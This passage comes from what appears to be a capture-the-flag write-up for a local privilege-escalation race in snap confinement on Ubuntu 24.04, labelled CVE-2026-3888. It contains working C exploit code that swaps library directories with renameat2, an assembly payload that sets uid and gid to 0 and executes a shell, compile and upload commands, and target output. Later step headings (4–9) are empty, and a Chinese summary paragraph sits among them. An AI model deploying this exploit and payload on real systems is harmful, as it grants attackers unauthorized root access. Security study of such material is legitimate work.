						ringbuf[ringpos % sizeof(ringbuf)] = byte;
						ringpos++;

						if(!swapped && ringpos >= tlen) {
						char check[512];
						for (int i = 0; i < tlen && i < (int)sizeof(check) - 1; i++)
								check[i] =ringbuf[(ringpos -tlen + i) % sizeof(ringbuf)];
						check[tlen] = '\0';

						if (strstr(check, TRIGGER)) {
								printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");


								if (syscall (SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
												AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0){
										/* atomic swap succeeded */
								} else {
										rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
										rename(EXCHANGE_SRC, EXCHANGE_DST);
								}

								swapped = 1;
								printf("[*] SWAP DONE! Race won.\n");
								printf("[*] Do NOT close this terminal.\n");
						}
						}
		}


		close(read_fd);
		int status;
		waitpid(pid, &status, 0);

		if (swapped)
				printf("[*] Race won! Our libraries are in the namespace.\n");
		else
				printf("[-] Trigger not detected. Race lost.\n");

		return swapped ? 0 : -1;
}


int main(int argc, char *argv[]) {
		if (argc < 2) {
				fprintf(stderr, "Usage: %s <payload.so>\n", argv[0]);
				return 1;
		}
		printf("[*] CVE-2026-3888 - firefox 24.04 helper\n");
		printf("[*] CWD: "); fflush(stdout); system("pwd");
		printf("[*] Setting up .snap and .exchange directiry...\n");
		if (setup_snap_and_exchange(argv[1]) < 0) return 1;
		printf("[+] Done. Re-enter sandbox to exploit.\n");
		return 0;
}
```
```
[★]$ gcc -O2 -static -o firefox_2404 firefox_2404.c
[★]$ file firefox_2404
firefox_2404: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=ef5e7a78d40cb3c90c41038239ad23833412c353, for GNU/Linux 3.2.0, not stripped
```
```
[★]$ cat librootshell.c
void _start(void) {
		/* setreuid(0, 0) */
		__asm__ volatile (
						"xor %%rdi, %%rdi\n"
						"xor %%rsi, %%rsi\n"
						"mov $0x71, %%rax\n"
						"syscall\n"
						::: "rax", "rdi", "rsi"
					 );

		/* setregid(0, 0) */
		__asm__ volatile (
						"xor %%rdi, %%rdi\n"
						"xor %%rsi, %%rsi\n"
						"mov $0x72, %%rax\n"
						"syscall\n"
						::: "rax", "rdi", "rsi"
					 );

		/* execve("/tmp/sh", {"/tmp/sh", NULL} ,NULL) */
		__asm__ volatile(
						"mov $0x68732f706d742f, %%rax\n"
						"push %%rax\n"
						"mov %%rsp, %%rdi\n"
						"push $0\n"
						"push %%rdi\n"
						"mov %%rsp, %%rsi\n"
						"xor %%rdx, %%rdx\n"
						"mov $0x3b, %%rax\n"
						"syscall\n"
						::: "rax", "rdi", "rsi", "rdx"
					);
}
```
```
[★]$ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
[★]$ mv librootshell.so payload.so
```
```
[★]$ scp firefox_2404 jonathan@10.129.18.95:/home/jonathan/
The authenticity of host '10.129.18.95 (10.129.18.95)' can't be established.
ED25519 key fingerprint is SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.18.95' (ED25519) to the list of known hosts.
jonathan@10.129.18.95's password: 
firefox_2404

[★]$ scp payload.so jonathan@10.129.18.95:/home/jonathan/
jonathan@10.129.18.95's password: 
payload.so                                           100% 9056   935.2KB/s   00:00    
```
```
jonathan@snapped:~$ ~/firefox_2404 ~/payload.so
[*] CVE-2026-3888 - firefox 24.04 helper
[*] CWD: /home/jonathan
[*] Setting up .snap and .exchange directiry...
[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
[+] Done. Re-enter sandbox to exploit.

jonathan@snapped:~$ ls .snap/usr/lib/x86_64-linux-gnu.exchange | head
audit
cryptsetup
e2fsprogs
engines-3
gconv
gio
glib-2.0
krb5
ld-linux-x86-64.so.2
libacl.so.1

```
```
jonathan@snapped:~$ cd /proc/9834/cwd
jonathan@snapped:/proc/9834/cwd$ ls -la
total 12
drwxrwxrwt  4 root root 4096 Apr 10 05:48 .
drwxr-xr-x 21 root root  540 Apr 10 05:45 ..
drwxr-xr-x  4 root root 4096 Apr 10 05:45 .snap
drwxrwxrwt  2 root root 4096 Apr 10 03:26 .X11-unix
```
#### Step 4 — Destroy cached namespace 
#### Step 5 — Win the race 
#### 我们编译并上传了本文末尾包含的helper和有效负载。Snap（攻击者拥有），复制285个真正的库到。通过一个微小的套接字启动带有调试输出的snap限制，检测绑定挂载触发器，然后通过renameat2（RENAME_EXCHANGE）自动交换目录。快照限制简历和以root用户绑定挂载我们的文件。我们得让这个终端一直开着，这样整个过程才能继续，是什么让我们中毒的命名空间存活
----------------------------------------------------------------------
Terminal 3
----------------------------------------------------------------------
#### Step 6 — Overwrite dynamic loader
#### Step 7 — Trigger root 
----------------------------------------------------------------------
Busybox shell
----------------------------------------------------------------------
#### Step 8 — Escape sandbox
----------------------------------------------------------------------
Terminal 3
----------------------------------------------------------------------
#### Step 9 — Full root
